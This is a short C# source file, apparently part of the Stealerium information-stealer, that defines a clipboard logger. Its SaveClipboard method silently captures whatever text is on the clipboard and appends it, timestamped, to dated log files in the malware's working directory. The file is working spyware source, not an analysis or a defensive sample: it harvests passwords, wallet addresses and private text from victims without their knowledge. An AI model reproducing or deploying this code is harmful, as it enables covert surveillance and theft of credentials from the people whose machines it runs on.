using System;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Clipper
{
    internal sealed class Logger
    {
        private static readonly string _logDirectory = Path.Combine(
            Paths.InitWorkDir(), "logs\\clipboard\\" +
                                 DateTime.Now.ToString("yyyy-MM-dd"));

        public static void SaveClipboard()
        {
            var buffer = ClipboardManager.ClipboardText;
            if (string.IsNullOrWhiteSpace(buffer))
                return;

            var logfile = _logDirectory + "\\clipboard_logs.txt";
            if (!Directory.Exists(_logDirectory))
                Directory.CreateDirectory(_logDirectory);

            File.AppendAllText(logfile,
                "### " + DateTime.Now.ToString("yyyy-MM-dd h:mm:ss tt") + " ###\n" + buffer + "\n\n");
        }
    }
}